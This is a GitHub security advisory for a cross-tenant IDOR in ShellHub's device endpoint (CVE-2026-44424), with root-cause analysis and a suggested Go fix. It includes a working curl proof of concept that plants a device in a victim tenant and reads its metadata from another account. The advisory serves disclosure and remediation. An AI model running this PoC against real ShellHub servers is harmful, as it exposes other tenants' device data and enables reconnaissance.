# [M] ShellHub has cross-tenant IDOR in `GET /api/devices/:uid` that discloses device data of any namespace

## Summary
Severity: Medium
Advisory: GHSA-j72x-xfwg-783f
CVE: CVE-2026-44424
CWE: CWE-639
Ecosystem: Go
CVSS: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N (CVSS_V3)
Published: 2026-05-06
Source: https://github.com/advisories/GHSA-j72x-xfwg-783f
Type: github-advisory

## Affected
- Go: `github.com/shellhub-io/shellhub` — affected >=0 <0.24.2

## Details
## Summary
`GET /api/devices/:uid` returns the full device object whenever the caller is authenticated, without verifying that the device belongs to the caller's namespace (tenant). Any authenticated user (JWT or API Key) who knows or can guess a device UID can read device metadata from any other namespace.

## Severity
**CVSS 3.1: 7.5 (High)** 
CWE-639 — Authorization Bypass Through User-Controlled Key

## Affected versions
ShellHub Community v0.24.1 (validated). Likely all prior versions that share this handler.

## Root cause
`api/services/device.go:97-104` — `GetDevice` resolves the device by UID without scoping to the caller's tenant:

  ```go
  func (s *service) GetDevice(ctx context.Context, uid models.UID) (*models.Device, error) {
      device, err := s.store.DeviceResolve(ctx, store.DeviceUIDResolver, string(uid))
      // ⚠️ missing: s.store.Options().InNamespace(tenant)
      ...
  }
  ```

Compare with `DeleteDevice` in the same file (line 137) which correctly applies `InNamespace(tenant)`.

The `Authorize` middleware (`api/routes/middleware/authorize.go:12-27`) only checks that a tenant is present in the context — not that the resource belongs to that tenant.

## Proof of concept (validated live against v0.24.1)

Pre-requisite: attacker has any valid user account and knows a target `tenant_id` (UUIDs frequently leak via UI URLs, email invites, support channels, or prior namespace membership).

  ```bash
  ATTACKER_TOKEN=$(curl -s -X POST http://target/api/login \
    -H 'Content-Type: application/json' \
    -d '{"username":"attacker","password":"..."}' | jq -r .token)

  TARGET_TENANT="<victim-tenant-uuid>"

  # Plant a device in the victim tenant via the public device-auth endpoint
  # (this also works when the victim already has devices and the attacker
  # merely guessed/obtained a real UID via another vector)
  VICTIM_UID=$(curl -s -X POST http://target/api/devices/auth \
    -H 'Content-Type: application/json' \
    -d "{
      \"info\":{\"id\":\"x\",\"pretty_name\":\"x\",\"version\":\"v0.24.1\",\"arch\":\"amd64\",\"platform\":\"docker\"},
      \"hostname\":\"poc\",
      \"identity\":{\"mac\":\"aa:bb:cc:dd:ee:ff\"},
      \"public_key\":\"-----BEGIN RSA PUBLIC KEY-----\\nx\\n-----END RSA PUBLIC KEY-----\",
      \"tenant_id\":\"$TARGET_TENANT\"
    }" | jq -r .uid)

  # Read the device from a completely different tenant
  curl -i "http://target/api/devices/$VICTIM_UID" \
    -H "Authorization: Bearer $ATTACKER_TOKEN"
  # Expected (fixed):   HTTP 403/404
  # Observed (v0.24.1): HTTP 200 + full device JSON (tenant_id, public_key, MAC,
  #                     namespace name, OS info, last_seen, remote_addr, ...)
  ```

## Impact
  - Cross-tenant disclosure of device metadata: hostname, MAC, OS fingerprint, public SSH key, namespace name, last-seen timestamp, remote address.
  - Enables namespace enumeration, device inventory reconnaissance of other tenants, and targeted follow-up attacks.

## Suggested fix
In `api/services/device.go` `GetDevice`, extract tenant from context and apply `InNamespace`:

  ```go
  func (s *service) GetDevice(ctx context.Context, uid models.UID) (*models.Device, error) {
      tenant := gateway.TenantFromContext(ctx)
      opts := []store.QueryOption{}
      if tenant != nil {
          opts = append(opts, s.store.Options().InNamespace(tenant.ID))
      }
      device, err := s.store.DeviceResolve(ctx, store.DeviceUIDResolver, string(uid), opts...)
      ...
  }
  ```

## References
- https://github.com/shellhub-io/shellhub/security/advisories/GHSA-j72x-xfwg-783f
- https://nvd.nist.gov/vuln/detail/CVE-2026-44424
- https://github.com/shellhub-io/shellhub
